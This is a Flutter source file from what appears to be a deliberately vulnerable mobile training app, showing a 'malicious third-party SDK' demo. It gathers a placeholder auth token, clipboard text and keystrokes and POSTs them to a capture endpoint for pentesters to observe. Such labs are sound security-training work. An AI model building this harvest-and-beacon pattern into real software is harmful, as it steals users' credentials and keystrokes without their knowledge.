import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:provider/provider.dart';

import '../../../app_config.dart';
import '../../../core/evidence_sink.dart';
import '../../../core/theme/dvma_colors.dart';
import '../../../core/vuln_demo_scaffold.dart';
import 'malicious_sdk.dart';

/// Malicious Third-Party SDK.
///
/// A bundled SDK exfiltrates data far beyond its stated purpose.
class MaliciousThirdPartySdkScreen extends StatefulWidget {
  const MaliciousThirdPartySdkScreen({super.key});

  static const String vulnId = 'malicious_third_party_sdk';

  @override
  State<MaliciousThirdPartySdkScreen> createState() =>
      _MaliciousThirdPartySdkScreenState();
}

class _MaliciousThirdPartySdkScreenState
    extends State<MaliciousThirdPartySdkScreen> {
  final _sdk = MaliciousSdk();
  String? _beacon;

  Future<void> _init() async {
    final beacon = _sdk.onInit(
      authToken: 'eyJhbGciOiJIUzI1NiJ9.session',
      clipboard: 'DVMA{clipboard_secret}',
      keystrokes: ['p', 'a', 's', 's', '1', '2', '3'],
    );
    final json = const JsonEncoder.withIndent('  ').convert(beacon);

    // VULN: the trojaned SDK really beacons the harvested auth token,
    // clipboard, and keystrokes to its collection endpoint, observable in
    // mitmproxy/tcpdump.
    final base = context.read<AppConfig>().captureBase;
    final url = '$base/beacon';
    var outcome = '';
    try {
      final resp = await http
          .post(
            Uri.parse(url),
            headers: const {'Content-Type': 'application/json'},
            body: json,
          )
          .timeout(const Duration(seconds: 6));
      outcome = 'POST $url -> HTTP ${resp.statusCode}';
    } catch (err) {
      outcome = 'POST $url -> no response ($err)';
    }

    DvmaEvidence.record(
      MaliciousThirdPartySdkScreen.vulnId,
      'sdk-beacon',
      'POST $url\n$json',
    );

    if (!mounted) return;
    setState(() => _beacon = '$json\n\n-> $outcome');
  }

  @override
  Widget build(BuildContext context) {
    return VulnDemoScaffold(
      vulnId: MaliciousThirdPartySdkScreen.vulnId,
      title: 'Malicious Third-Party SDK',
      difficulty: DvmaDifficulty.medium,
      explanation:
          'A bundled SDK advertised as "${MaliciousSdk.statedPurpose}" actually '
          'harvests the auth token, clipboard, and keystrokes on init and '
          'beacons them to ${MaliciousSdk.exfilEndpoint}. A pentester sees the '
          'exfil in mitmproxy; jadx reveals the endpoint.',
      children: [
        DemoActionButton(label: 'Initialize SDK', onPressed: () => _init()),
        if (_beacon != null)
          EvidencePanel(label: 'covert beacon (exfiltrated)', value: _beacon!),
      ],
    );
  }
}
